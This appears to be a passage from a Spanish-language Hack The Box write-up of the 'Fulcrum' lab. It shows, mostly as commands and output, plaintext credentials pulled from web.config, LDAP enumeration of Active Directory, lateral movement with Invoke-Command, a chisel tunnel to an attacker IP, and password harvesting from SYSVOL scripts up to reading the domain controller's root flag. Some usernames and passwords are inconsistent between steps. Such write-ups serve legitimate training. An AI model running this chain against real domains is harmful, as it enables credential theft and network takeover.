
```powershell
*Evil-WinRM* PS C:\inetpub\wwwroot> cat web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration xmlns="http://schemas.microsoft.com/.NetConfiguration/v2.0">
    <appSettings />
    <connectionStrings>
        <add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    </connectionStrings>
    <system.web>
        <membership defaultProvider="ADProvider">
            <providers>
                <add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
            </providers>
        </membership>
    </system.web>
<system.webServer>
   <httpProtocol>
      <customHeaders>
           <clear />
      </customHeaders>
   </httpProtocol>
        <defaultDocument>
            <files>
                <clear />
                <add value="Default.asp" />
                <add value="Default.htm" />
                <add value="index.htm" />
                <add value="index.html" />
                <add value="iisstart.htm" />
            </files>
        </defaultDocument>
</system.webServer>
</configuration>
*Evil-WinRM* PS C:\inetpub\wwwroot> 
```

En la cabecera del archivo podemos ver unas credenciales que se usan por LDAP al DC 

```xml
<connectionStrings>
        <add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    </connectionStrings>
    <system.web>
        <membership defaultProvider="ADProvider">
            <providers>
                <add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
            </providers>
        </membership>
    </system.web>
```

### LDAP
* * * 

Enumeraremos el dominio del Directorio Activo por LDAP 

```powershell
*Evil-WinRM* PS C:\Users\WebUser\Documents> $adsi = New-Object ADSI("LDAP://dc.fulcrum.local", "fulcrum\ldap", "PasswordForSearching123!")
```

```powershell
*Evil-WinRM* PS C:\Users\WebUser\Documents> $searcher = New-Object ADSISearcher($adsi, "(&(objectClass=user))")
```

Ahora que tenemos las credenciales cargadas, enumeraremos el dominio

<img src="/assets/img/HTB/Fulcrum/ldap.png">

Ahora que nos funciona la enumeración, veremos las propiedades

<img src="/assets/img/HTB/Fulcrum/enum.png">

#### Enumeración con PowerShell
* * * 

Hay 8 usuarios en el Directorio Activo

```powershell
*Evil-WinRM* PS C:\Users\WebUser\Documents> ($searcher.FindAll() | measure-object).count
8
```

Ahora dumpearemos todas las propiedades del usuario 

<img src="/assets/img/HTB/Fulcrum/usuarios.png">

Obtenemos las credenciales `BTables:++FileServerLogon12345++`

#### Administradores del dominio
* * * 

Aprovechando que podemos enumerar el dominio por LDAP, enumeraremos los administradores del dominio, hay 2

<img src="/assets/img/HTB/Fulcrum/domain-admins.png>

### Ejecución en FILE 
* * *

Cargaremos las credenciales en memoria para invocar comandos en el equipo FILE

```powershell
*Evil-WinRM* PS C:\> $btpass = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
*Evil-WinRM* PS C:\> $btcred = New-Object System.Management.Automation.PSCredential('FULCRUM\btables', $btpass)
*Evil-WinRM* PS C:\> Invoke-Command -ComputerName file.fulcrum.local -Credential $btcred -ScriptBlock { whoami }
fulcrum\btables
```

Ahora que podemos ejecutar comandos, aprovecharé para leer la user flag

```powershell
*Evil-WinRM* PS C:\> Invoke-Command -ComputerName file.fulcrum.local -Credential $btcred -ScriptBlock { cat \users\btables\Desktop\user.txt }
fce52521c8f872b514f037fada78daf4
```

Subiremos el chisel en el webserver para hacer que el puerto 5985 de la máquina FILE sea el puerto 5985 de nuestra máquina atacante.

```
*Evil-WinRM* PS C:\Users\WebUser\Documents> .\chisel.exe client 10.10.14.12:1234 R:5985:192.168.122.132:5985
```

Ahora nos conectaremos con `Evil-WinRM` en la máquina FILE

```sh
❯ evil-winrm -i 127.0.0.1 -u btables -p '++FileServerLogon12345++'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\BTables\Documents> 
```

## Consola como 932a (DC)
* * * 

### Enumeración
* * *

#### FILE
* * * 

Enumeraremos los archivos compartidos a nivel de red

```
*Evil-WinRM* PS C:\Users\BTables\Documents> Get-SMBShare

Name   ScopeName Path Description
----   --------- ---- -----------
ADMIN$ *              Remote Admin
C$     *              Default share
IPC$   *              Remote IPC
```

#### DC
* * *

Usaremos el recurso IPC$ del DC

```powershell
*Evil-WinRM* PS C:\Users\BTables\Documents> net use \\dc.fulcrum.local\IPC$ /user:fulcrum\btables ++FileServerLogon12345++ 
The command completed successfully.

*Evil-WinRM* PS C:\Users\BTables\Documents> net view \\dc.fulcrum.local
Shared resources at \\dc.fulcrum.local



Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The command completed successfully.
```

Listaremos los archivos que hay en el recurso sysvol

<img src="/assets/img/HTB/Fulcrum/smb.png">

Todos los archivos parecn tener credenciales (usuario y contraseña) y son todos diferentes.

```powershell
*Evil-WinRM* PS C:\Users\BTables\Documents> cat \\dc.fulcrum.local\sysvol\fulcrum.local\scripts\00034421-648d-4835-9b23-c0d315d71ba3.ps1
# Map network drive v1.0
$User = 'be36'
$Pass = '@fulcrum_43bd6d26c168_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred
```

Como antes vimos que el usuario 932a es Administrador de Dominio, buscaremos por sus credenciales

```powershell
 *Evil-WinRM* PS C:\> Select-String -Path "\\dc.fulcrum.local\sysvol\fulcrum.local\scripts\*.ps1" -Pattern Administrator 
 *Evil-WinRM* PS C:\> Select-String -Path "\\dc.fulcrum.local\sysvol\fulcrum.local\scripts\*.ps1" -Pattern 923a
 \\dc.fulcrum.local\sysvol\fulcrum.local\scripts\3807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:$Pass = '@fulcrum_df0923a7ca40_$' | ConvertTo-SecureString -AsPlainText -Force
 \\dc.fulcrum.local\sysvol\fulcrum.local\scripts\a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:$User = '923a'
```

El archivo `\\dc.fulcrum.local\sysvol\fulcrum.local\scripts\a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1` tiene las credenciales del usuario 932a

```powershell
*Evil-WinRM* PS C:\Users\BTables\Documents> cat \\dc.fulcrum.local\sysvol\fulcrum.local\scripts\3807dacb-db2a-4627-b2a3-123d048590e7.ps1
# Map network drive v1.0
$User = '9f68'
$Pass = '@fulcrum_df0923a7ca40_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred
```

### Leer la flag
* * * 

Ahora que tenemos credenciales válidas, podremos ejecutar comandos en el DC, leeremos la flag del usuario `Administrador`

```powershell
*Evil-WinRM* PS C:\Users\BTables\Documents> $pass = ConvertTo-SecureString '@fulcrum_bf392748ef4e_$' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\BTables\Documents> $cred = New-Object System.Management.Automation.PSCredential('FULCRUM\923a', $pass)
*Evil-WinRM* PS C:\Users\BTables\Documents> Invoke-Command -Computer dc.fulcrum.local -Credential $cred -scriptblock { whoami ; hostname }
fulcrum\923a
DC
*Evil-WinRM* PS C:\Users\BTables\Documents> Invoke-Command -Computer dc.fulcrum.local -Credential $cred -scriptblock { cat \users\administrator\desktop\root.txt }
8ddbe372e57c019bb6c4cdb5b35a0cab
*Evil-WinRM* PS C:\Users\BTables\Documents> 
```